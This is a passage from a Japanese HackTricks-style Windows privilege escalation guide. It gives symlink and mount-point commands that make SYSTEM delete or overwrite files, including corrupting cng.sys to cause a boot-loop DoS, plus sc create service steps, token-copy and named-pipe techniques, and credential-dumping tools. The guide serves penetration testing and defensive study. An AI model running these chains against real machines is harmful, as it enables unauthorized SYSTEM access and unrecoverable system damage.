- オプション C: `\RPC Control` に **symlink** を作成する:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> これはフォルダのメタデータを格納する NTFS 内部ストリームを対象とします — これを削除するとフォルダが削除されます。

5. Step 5: oplock を解放する
- SYSTEM プロセスは処理を続行し、`file1.txt` の削除を試みます。
- しかし、junction + symlink により、実際に削除されるのは次のものです:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**結果**: `C:\Config.Msi` は SYSTEM によって削除されます。

### Arbitrary Folder Create から Permanent DoS へ

**SYSTEM/admin として任意の folder を作成できる** primitive を exploit します — **files を write** したり、**weak permissions を設定**したりできなくても可能です。

**critical Windows driver** の名前を付けた **folder**（file ではありません）を作成します。例:
```
C:\Windows\System32\cng.sys
```
- このパスは通常、`cng.sys` kernel-mode driver に対応します。
- **フォルダーとして事前に作成**すると、Windows は起動時に実際の driver を読み込めなくなります。
- その後、Windows は起動中に `cng.sys` の読み込みを試みます。
- フォルダーを検出すると、**実際の driver の解決に失敗**し、**クラッシュするか起動を停止**します。
- **fallback はなく**、外部からの介入（boot repair や disk access など）なしに**復旧する手段もありません**。

### 特権 log/backup path + OM symlink から任意ファイルの上書き / boot DoS へ

**特権 service** が**書き込み可能な config**から読み取った path に logs/exports を書き込む場合、**Object Manager symlink + NTFS mount point**でその path をリダイレクトし、**SeCreateSymbolicLinkPrivilege がなくても**特権による書き込みを任意ファイルの上書きに変えられます。<sup>[[15]](#references)</sup>

**要件**
- target path を保存する config が攻撃者による書き込み可能であること（例：`%ProgramData%\...\.ini`）。
- `\RPC Control` への mount point と OM file symlink を作成できること（James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)）。<sup>[[16]](#references)[[17]](#references)</sup>
- その path に書き込む特権 operation（log、export、report）。

**Example chain**
1. config を読み取り、特権 log の destination を特定します。例：`C:\ProgramData\ICONICS\IcoSetup64.ini` 内の `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt`。
2. admin 権限なしで path をリダイレクトします：
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. 特権コンポーネントがログを書き込むのを待つ（例：admin が「send test SMS」を実行する）。これにより、書き込み先が `C:\Windows\System32\cng.sys` になります。
4. 上書きされた対象を（hex/PE parser で）調査して破損を確認します。再起動すると、Windows は改ざんされた driver path を読み込むため、**boot loop DoS** が発生します。これは、特権サービスが write のために開く保護対象ファイル全般にも応用できます。

> `cng.sys` は通常 `C:\Windows\System32\drivers\cng.sys` から読み込まれますが、`C:\Windows\System32\cng.sys` にコピーが存在すると、そちらが先に試行される可能性があります。そのため、破損データの信頼できる DoS sink になります。



## **From High Integrity to System**

### **New service**

すでに High Integrity process を実行している場合、**新しい service を作成して実行する**だけで、**SYSTEM への path** は簡単に確保できます。
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> service binary を作成する際は、それが有効な service であること、または binary が必要なアクションを迅速に実行することを確認してください。有効な service でない場合、20秒後に kill されます。

### AlwaysInstallElevated

High Integrity process から、**AlwaysInstallElevated registry entries を有効化**し、_**.msi**_ wrapper を使用して reverse shell を**インストール**できます。\
[関連する registry keys と _.msi_ package のインストール方法についての詳細はこちら。](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**コードは** [**こちらで確認できます**](seimpersonate-from-high-to-system.md)**。**

### SeDebug + SeImpersonate から Full Token privileges へ

これらの token privileges を持っている場合（おそらく、すでに High Integrity の process 内で見つかります）、SeDebug privilege を使用して（protected processes 以外の）**ほぼすべての process を open**し、その process の **token を copy**して、**その token で任意の process を作成**できます。\
この technique では通常、**すべての token privileges を持つ SYSTEM として実行されている process**を選択します（_はい、すべての token privileges を持たない SYSTEM processes も存在します_）。\
提案した technique を実行するコードの**例は** [**こちらで確認できます**](sedebug-+-seimpersonate-copy-token.md)**。**

### **Named Pipes**

この technique は meterpreter が `getsystem` で privilege escalation を実行するために使用します。この technique では、**pipe を作成し、その pipe に書き込むための service を作成または abuse します**。その後、**`SeImpersonate`** privilege を使用して pipe を作成した **server** は、pipe client（service）の **token を impersonate**して SYSTEM privileges を取得できます。\
name pipes について[**さらに学びたい場合はこちらを読んでください**](#named-pipe-client-impersonation)。\
name pipes を使用して [**high integrity から System へ移行する方法の例はこちらを読んでください**](from-high-integrity-to-system-with-name-pipes.md)。

### Dll Hijacking

**SYSTEM**として実行されている **process** によって **load**される **dll を hijack**できれば、その permissions で任意の code を実行できます。したがって、Dll Hijacking はこの種の privilege escalation にも有用です。さらに、dll の load に使用される folder に対する **write permissions** を持つため、**High Integrity process からの方がはるかに容易に実行できます**。\
**Dll hijacking について** [**さらに学ぶことができます**](dll-hijacking/index.html)**。**

### **Administrator または Network Service から System へ**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### LOCAL SERVICE または NETWORK SERVICE から full privs へ

**読む:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## その他の情報

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Windows local privilege escalation vectors を探すための最適な tool:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- misconfigurations と sensitive files を check（**[**こちらを確認**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**）。Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- 可能性のある misconfigurations を check し、情報を収集（**[**こちらを確認**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**）。**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- misconfigurations を check**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY、WinSCP、SuperPuTTY、FileZilla、RDP の保存された session information を抽出します。local では -Thorough を使用してください。**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager から credentials を抽出します。Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- 収集した passwords を domain 全体に対して spray**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh は PowerShell ADIDNS/LLMNR/mDNS spoofer であり、man-in-the-middle tool です。**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- 基本的な privesc Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- 既知の privesc vulnerabilities を検索（Watson の使用が推奨されるため DEPRECATED）\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- local checks **(Admin rights が必要)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- 既知の privesc vulnerabilities を検索（VisualStudio を使用して compile する必要があります）([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- misconfigurations を検索して host を enumerate します（privesc tool というより情報収集 tool です）（compile が必要）**(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- 多数の software から credentials を抽出します（github に precompiled exe があります）**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp の C# への port**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- misconfiguration を check（github に executable precompiled があります）。推奨しません。Win10 では正常に動作しません。\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- 可能性のある misconfigurations を check（python からの exe）。推奨しません。Win10 では正常に動作しません。

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- この post に基づいて作成された tool（正常に動作するために accesschk への access は必要ありませんが、使用することはできます）。

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** の output を読み取り、動作する exploits を推奨します（local python）\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** の output を読み取り、動作する exploits を推奨します（local Python）

**Meterpreter**

_multi/recon/local_exploit_suggestor_

正しいバージョンの .NET を使用して project を compile する必要があります（[こちらを参照](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)）。victim host にインストールされている .NET の version を確認するには、次のコマンドを実行します。
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## References

- [1] [Windows Privilege Escalationの基礎](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [脆弱なフォルダー権限を悪用したPrivilege Escalation](http://www.greyhathacker.net/?p=738)
- [3] [Windows Privilege Escalation - cheatsheet](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Windows / Linux Local Privilege Escalation Workshop](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Windows Attacks: AT is the new black (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Privilege Escalation - Windows - Total OSCP Guide](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Privilege Escalation - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Windows Privilege Escalation Guide](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Windows-Privilege-Escalation checklist](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Pentesters向けWindows Privilege Escalation Methods](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: SMTP経由のWord VBA macro phishing → hMailServer credential decryption → Veeam CVE-2023-27532によるSYSTEM化](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP（RCE）とkernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Silver Foxを追う: Kernel ShadowsにおけるCat & Mouse](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – SCADA Systemに存在するPrivileged File System Vulnerability](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Symbolic Link Testing Tools – CreateSymlinkの使用方法](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [過去へのLink。WindowsでのSymbolic Linksの悪用](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js Trust Falls: WindowsにおけるDangerous Module Resolution](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.js modules: `node_modules` foldersからのloading](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - C/C++ checklist challenges、解答済み](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - RtlQueryRegistryValues function](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own with Microslop: CLDFLTとDirectX Kernel Race ConditionsのchainによるWindows LPE](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [One I/O Ring to Rule Them All: Windows 11におけるFull Read/Write Exploit Primitive](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Arbitrary File Deletesを悪用したPrivilege Escalationとその他のGreat Tricks](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - FilesystemEoPs exploit code](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – WSUS Attacks Part 2: CVE-2020-1013、Windows 10 Local Privilege Escalation 1-Day](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Credential ManagerとWindows Vaultを探る](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Kerberos Resource Based Constrained Delegation: Image ChangeがPrivilege Escalationにつながる場合](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Windows 10 Ssh AgentからのSsh Private Keysの抽出](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Enterprise Update ServersをBackdoor Factoriesに変える (0_o) – Part 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Enterprise Update ServersをBackdoor Factoriesに変える (0_o) – Part 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
{{#include ../../banners/hacktricks-training.md}}
